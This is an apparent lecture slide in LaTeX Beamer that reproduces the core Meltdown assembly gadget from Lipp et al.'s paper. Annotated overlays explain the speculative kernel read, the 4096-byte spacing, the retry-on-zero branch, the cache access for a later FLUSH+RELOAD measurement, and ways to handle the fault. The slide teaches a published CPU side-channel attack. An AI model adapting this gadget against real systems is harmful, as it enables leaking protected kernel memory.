\begin{frame}[fragile]{Meltdown}

{\small from Lipp et al, ``Meltdown: Reading Kernel Memory from User Space''} \\
\lstset{
    language=myasm,
    style=small,
    moredelim={**[is][\btHL<2>]{@2}{2@}},
    moredelim={**[is][\btHL<3>]{@3}{3@}},
    moredelim={**[is][\btHL<4>]{@4}{4@}},
    moredelim={**[is][\btHL<5>]{@5}{5@}},
}
\begin{lstlisting}
    // %rcx = kernel address
    // %rbx = array to load from to cause eviction
    xor %rax, %rax      // rax <- 0
retry:
    // rax <- memory[kernel address] (segfaults)
        // but check for segfault done out-of-order on Intel at time
    @5movb (%rcx), %al5@
    // rax <- memory[kernel address] * 4096 [speculated]
    @2shl $0xC, %rax2@
    @3jz retry3@                // not-taken branch
    // access array[memory[kernel address] * 4096]
    @4mov (%rbx, %rax), %rbx4@
\end{lstlisting}
\begin{tikzpicture}[overlay,remember picture]
\coordinate (box place) at ([yshift=0.25cm]current page.center);
\tikzset{
    box/.style={at=(box place), anchor=south,align=left,fill=white,draw=red,ultra thick}
}
\begin{visibleenv}<2>
\node[box] {space out accesses by 4096 \\
ensure separate cache sets and \\
avoid triggering prefetcher
};
\end{visibleenv}
\begin{visibleenv}<3>
\node[box] {
    repeat access if zero \\
    apparently value of zero speculatively read \\
    when real value not yet available
};
\end{visibleenv}
\begin{visibleenv}<4>
\node[box] {
    access cache to allow measurement later \\
    in paper with FLUSH+RELOAD instead \\\
    of PRIME+PROBE technique
};
\end{visibleenv}
\begin{visibleenv}<5>
\node[box] {
    segfault actually happens eventually \\
    option 1: okay, just start a new process every time \\
    option 2: way of suppressing exception (transactional memory support)
};
\end{visibleenv}
\end{tikzpicture}
\end{frame}

